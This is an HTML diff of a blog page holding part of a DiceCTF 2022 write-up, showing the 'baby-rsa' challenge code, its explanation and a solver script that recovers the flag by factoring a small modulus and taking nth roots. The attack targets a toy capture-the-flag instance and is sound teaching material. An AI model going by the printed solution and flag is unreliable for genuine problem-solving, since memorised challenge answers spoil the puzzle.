-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> getPrime, bytes_to_long, long_to_bytes
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">getAnnoyingPrime</span>(nbits, e):
-</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">while</span> <span style="color:#069;font-weight:bold">True</span>:
-</span></span><span style="display:flex;"><span>		p <span style="color:#555">=</span> getPrime(nbits)
-</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> (p<span style="color:#555">-</span><span style="color:#f60">1</span>) <span style="color:#555">%</span> e<span style="color:#555">**</span><span style="color:#f60">2</span> <span style="color:#555">==</span> <span style="color:#f60">0</span>:
-</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">return</span> p
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>nbits <span style="color:#555">=</span> <span style="color:#f60">128</span>
-</span></span><span style="display:flex;"><span>e <span style="color:#555">=</span> <span style="color:#f60">17</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p <span style="color:#555">=</span> getAnnoyingPrime(nbits, e)
-</span></span><span style="display:flex;"><span>q <span style="color:#555">=</span> getAnnoyingPrime(nbits, e)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>flag <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#34;dice{???????????????????????}&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>N <span style="color:#555">=</span> p <span style="color:#555">*</span> q
-</span></span><span style="display:flex;"><span>cipher <span style="color:#555">=</span> <span style="color:#366">pow</span>(bytes_to_long(flag), e, N)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#34;N = </span><span style="color:#a00">{</span>N<span style="color:#a00">}</span><span style="color:#c30">&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#34;e = </span><span style="color:#a00">{</span>e<span style="color:#a00">}</span><span style="color:#c30">&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#34;cipher = </span><span style="color:#a00">{</span>cipher<span style="color:#a00">}</span><span style="color:#c30">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#c30">N = 57996511214023134147551927572747727074259762800050285360155793732008227782157
-</span></span></span><span style="display:flex;"><span><span style="color:#c30">e = 17
-</span></span></span><span style="display:flex;"><span><span style="color:#c30">cipher = 19441066986971115501070184268860318480501957407683654861466353590162062492971
-</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span><span class="p">,</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getAnnoyingPrime</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="n">nbits</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">e</span><span class="o">**</span><span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">nbits</span> <span class="o">=</span> <span class="mi">128</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">17</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">getAnnoyingPrime</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="n">getAnnoyingPrime</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;dice{???????????????????????}&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
+</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;N = </span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;e = </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;cipher = </span><span class="si">{</span><span class="n">cipher</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">N = 57996511214023134147551927572747727074259762800050285360155793732008227782157
+</span></span></span><span class="line"><span class="cl"><span class="s1">e = 17
+</span></span></span><span class="line"><span class="cl"><span class="s1">cipher = 19441066986971115501070184268860318480501957407683654861466353590162062492971
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Reading the code, $N$ is small enough, so that we can easily factor it (with factordb). After we retrieve $p$ and $q$, we found out that $GCD(e, phi) = 17$, which mean there exists multiple solution to the RSA equation.
 However, $GCD(e, phi)$ is small enough, where we can easily find the $nth_root$ of the $cipher$. After retrieving the possible solutions, we just need to check which one contains <strong>dice{</strong> on it. Below is the solution.</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>n <span style="color:#555">=</span> <span style="color:#f60">57996511214023134147551927572747727074259762800050285360155793732008227782157</span>
-</span></span><span style="display:flex;"><span>e <span style="color:#555">=</span> <span style="color:#f60">17</span>
-</span></span><span style="display:flex;"><span>c <span style="color:#555">=</span> <span style="color:#f60">19441066986971115501070184268860318480501957407683654861466353590162062492971</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># n is small, so it is easy to factor it</span>
-</span></span><span style="display:flex;"><span>p <span style="color:#555">=</span> <span style="color:#f60">172036442175296373253148927105725488217</span>
-</span></span><span style="display:flex;"><span>q <span style="color:#555">=</span> <span style="color:#f60">337117592532677714973555912658569668821</span>
-</span></span><span style="display:flex;"><span>phi <span style="color:#555">=</span> (p<span style="color:#555">-</span><span style="color:#f60">1</span>)<span style="color:#555">*</span>(q<span style="color:#555">-</span><span style="color:#f60">1</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># After analysis, GCD(e, phi) is 17. The solution is small enough to be factored with nth_root, </span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># where one of the root will be our flag</span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> m <span style="color:#000;font-weight:bold">in</span> Mod(c, n)<span style="color:#555">.</span>nth_root(gcd(e, phi), <span style="color:#366">all</span><span style="color:#555">=</span><span style="color:#069;font-weight:bold">True</span>):
-</span></span><span style="display:flex;"><span>    flag <span style="color:#555">=</span> long_to_bytes(m)
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;dice&#39;</span> <span style="color:#000;font-weight:bold">in</span> flag:
-</span></span><span style="display:flex;"><span>        <span style="color:#366">print</span>(<span style="color:#c30">b</span><span style="color:#c30">&#39;Flag: {flag.decode()}&#39;</span>)
-</span></span><span style="display:flex;"><span>        exit()
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">57996511214023134147551927572747727074259762800050285360155793732008227782157</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">17</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">19441066986971115501070184268860318480501957407683654861466353590162062492971</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># n is small, so it is easy to factor it</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">172036442175296373253148927105725488217</span>
+</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="mi">337117592532677714973555912658569668821</span>
+</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># After analysis, GCD(e, phi) is 17. The solution is small enough to be factored with nth_root, </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># where one of the root will be our flag</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">Mod</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span><span class="o">.</span><span class="n">nth_root</span><span class="p">(</span><span class="n">gcd</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">),</span> <span class="nb">all</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;dice&#39;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Flag: {flag.decode()}&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
 <p>Flag: dice{cado-and-sage-say-hello}</p>
 </blockquote>
-
-      </div>
-      
-        
-  <aside class="toc-container">
-    <a href="#" style="font-weight: 700; color: black;">DiceCTF 2022</a>
-    <div class="js-toc">
-      <details>
-          <summary>Table of Contents
-          </summary>
-          <div>
-              <nav id="TableOfContents">
-  <ul>
-    <li><a href="#knock-knock">knock-knock</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#interview-opportunity">interview-opportunity</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#flagle">flagle</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#baby-rsa">baby-rsa</a></li>
-  </ul>
-</nav>
-          </div>
-      </details>
-    </div>
-  </aside>
-
-
-      
-    </div>
-
-    
-        <div class="tags">
-            
-                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
-            
-                <a href="https://chovid99.github.io/tags/dicectf">DiceCTF</a>
-            
-                <a href="https://chovid99.github.io/tags/web">web</a>
-            
-                <a href="https://chovid99.github.io/tags/rsa">rsa</a>
-            
-                <a href="https://chovid99.github.io/tags/crypto">crypto</a>
-            
-                <a href="https://chovid99.github.io/tags/wasm">wasm</a>
-            
-                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
-            
-                <a href="https://chovid99.github.io/tags/rop">rop</a>
-            
-                <a href="https://chovid99.github.io/tags/format-string">format string</a>
-            
-                <a href="https://chovid99.github.io/tags/2022">2022</a>
-            
+<h1 id="social-media">Social Media</h1>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>
+                    
+                </span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/dicectf-2022/" data-title="DiceCTF 2022" data-via="Chovid99" data-hashtags="Writeup,DiceCTF,web,rsa,crypto,wasm,pwn,rop,format string,2022"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/dicectf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
         </div>
-    
-    
-    
-  <div id="comment">
-    
-    
-  </div>
-
-
-</section>
-
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-<script src="/js/tocbot.min.js"></script>
-
-<script type="text/javascript">
-  tocbot.init({
-      
-      tocSelector: '.js-toc',
-      
-      contentSelector: '.js-toc-content',
-      headingSelector: 'h1, h2, h3',
-      orderedList: false,
-      headingLabelCallback: s => s.substr(0, s.length-2),
-      collapseDepth: 2
-  });
-  function initTOC() {
-    var windowWidth = 1316;
-    var $block_2 = $(".toc-container");
-    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
-    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
-  }
-  window.onload = initTOC;
-
-  var lastWindowWidth = $(window).width();
-  $(window).resize(function() {
-    var $block_2 = $(".toc-container");
-    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
-    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
-    lastWindowWidth = $(window).width();
-  });
-</script>
-
-    </main>
-    
-    <footer id="footer">
-    
-        <div id="social">
-
-
-    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
-        
-        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-    
-    <title>Github</title>
-    <desc>Created with Sketch.</desc>
-    <defs></defs>
-    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
-        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
-            <g id="Github" transform="translate(264.000000, 939.000000)">
-                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
-                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
-            </g>
-        </g>
-    </g>
-</svg>
-    </a>
-
-    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
-        
-        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
-	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
-	 xml:space="preserve">
-<g>
-	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
-		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
-		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
-		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
-		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
-		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
-		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
-		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
-		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
-		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
-		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
-		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
-		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
-		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
-</g>
-</svg>
-
-    </a>
-
-
-</div>
-
-    
-
-    <div class="copyright">
-    
-       © Copyright 
-       2023 
-       <span class="split">
-        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
-  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
-</svg>
-       </span>
-       Chovid99
-    
     </div>
 
-    
-</footer>
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/dicectf/">DiceCTF</a>,&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/rsa/">rsa</a>,&nbsp;<a href="/tags/crypto/">crypto</a>,&nbsp;<a href="/tags/wasm/">wasm</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/rop/">rop</a>,&nbsp;<a href="/tags/format-string/">format string</a>,&nbsp;<a href="/tags/2022/">2022</a></section>
+        <section>
+            
+        </section>
+    </div>
 
+    <div class="post-nav"><a href="/posts/gcc-3.0-ctf-2022/" class="prev" rel="prev" title="GCC 3.0 CTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>GCC 3.0 CTF 2022</a>
